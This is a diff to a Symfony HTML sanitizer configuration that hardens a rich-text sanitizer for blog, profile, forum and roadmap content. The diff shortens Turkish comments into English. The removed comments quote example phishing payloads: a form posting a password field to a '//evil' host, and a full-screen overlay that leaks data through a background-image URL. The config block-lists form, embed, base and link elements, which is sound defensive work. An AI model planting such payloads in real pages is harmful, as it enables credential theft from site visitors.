@@ -1,16 +1,10 @@
 framework:
     html_sanitizer:
         sanitizers:
-            # Jodit gibi zengin metin editörlerinden gelen HTML'i kaydetmeden
-            # önce temizlemek için (Manifesto Law 5.3: "rich-text field...
-            # aggressively sanitized using symfony/html-sanitizer before
-            # saving"). Node modülünden bağımsız, generic bir sanitizer —
-            # herhangi bir Node type'ında rich-text alanı olan modül kullanabilir.
+            # Sanitizes rich-text HTML before save (Manifesto Law 5.3).
+            # Generic sanitizer usable by any module with rich-text fields.
             #
-            # Kullananlar: Blog gövdesi (PostAdminController::mapDtoToNode),
-            # profil biyografisi (AACPUserController::mapProfileDtoToUser),
-            # forum gönderisi (ForumTopicService::sanitizeBody) ve Roadmap
-            # gövdesi (RoadmapEntryAdminController::sanitizeBody).
+            # Used by: Blog body, profile bio, forum posts, Roadmap body.
             cpalius_richtext:
                 allow_safe_elements: true
                 allow_static_elements: true
@@ -22,33 +16,12 @@ framework:
                     class: '*'
                     data-post: ['blockquote']
 
-                # ─────────────────────────────────────────────────────────
-                # SERTLEŞTİRME (FAZ 1 doğrulaması sırasında bulundu)
-                # ─────────────────────────────────────────────────────────
-                # allow_static_elements, Symfony'nin "script çalıştırmayan"
-                # olarak sınıflandırdığı geniş bir eleman kümesini açar.
-                # Bu sınıflandırma SCRIPT güvenliği içindir, KİMLİK AVI
-                # güvenliği için değil — ve gerçek payload'larla test
-                # edildiğinde iki vektörün geçtiği görüldü:
+                # Hardening (Phase 1 validation): allow_static_elements is script-safe,
+                # not phishing-safe — embedded forms and full-screen overlays were blocked.
                 #
-                #   <form action="//evil"><input type="password"> ...
-                #     Sayfaya gömülü bir form, tarayıcının şifre
-                #     yöneticisini tetikleyebilir ve girilen veriyi
-                #     saldırganın sunucusuna POST eder. Blog yazısı, forum
-                #     gönderisi veya profil biyografisi içine gömülebildiği
-                #     için gerçek bir kimlik avı yüzeyidir.
-                #
-                #   <div style="position:fixed;width:100%;height:100%">
-                #     Tam ekran kaplama ile arayüz yanıltma (UI redressing);
-                #     background-image: url(//evil/?...) ile veri sızdırma.
-                #     (url(javascript:) modern tarayıcılarda ÇALIŞMAZ —
-                #     tehdit script değil, düzen ve gizlilik ihlalidir.)
-                #
-                # block_elements, etiketi kaldırır ama İÇİNDEKİ METNİ
-                # KORUR — kullanıcının yazdığı görünür içerik kaybolmaz,
-                # yalnızca etkileşimli/tehlikeli kabuk düşer.
+                # block_elements strips tags but keeps inner text — visible content is preserved.
                 block_elements:
-                    # Kimlik avı yüzeyi
+                    # Phishing surface
                     - form
                     - input
                     - button
@@ -61,20 +34,18 @@ framework:
                     - legend
                     - datalist
                     - output
-                    # Gömülü/harici içerik yükleyiciler
+                    # Embedded/external content loaders
                     - object
                     - embed
                     - applet
                     - param
-                    # Belge bağlamını ele geçirenler: <base> sayfadaki TÜM
-                    # göreli linkleri saldırganın alan adına yönlendirir,
-                    # <link> harici stil sayfası yükler.
+                    # Document context hijackers: <base> retargets relative URLs;
+                    # <link> loads external stylesheets.
                     - base
                     - link
 
-                # "style" özniteliği hiçbir zengin metin alanında meşru bir
-                # ihtiyaç değildir: görsel biçimlendirme "class" üzerinden
-                # (yukarıda '*' ile serbest) tema CSS'ine bırakılır.
+                # "style" is never needed in rich text — formatting uses "class"
+                # (allowed above as '*') and theme CSS.
                 drop_attributes:
                     style: '*'
 
